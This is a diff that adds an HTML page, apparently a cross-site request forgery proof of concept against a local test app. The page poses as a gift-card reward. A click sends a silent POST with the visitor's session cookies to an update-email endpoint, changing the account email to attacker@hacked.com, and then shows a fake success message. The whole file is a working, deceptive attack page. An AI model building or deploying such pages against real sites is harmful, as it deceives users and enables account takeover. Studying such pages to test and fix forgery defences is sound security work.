@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Claim Your Reward!</h1>
+    <a href="#" onclick="triggerAttack()">Click here to claim your gift card!</a>
+    <script>
+        function triggerAttack() {
+            // Silent POST request to vulnerable endpoint
+            fetch('http://localhost:5000/update-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'new_email=attacker@hacked.com',
+                credentials: 'include'  // Include session cookies
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Reward claimed! Check your email.');
+                } else {
+                    alert('Failed to claim reward. Try again.');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
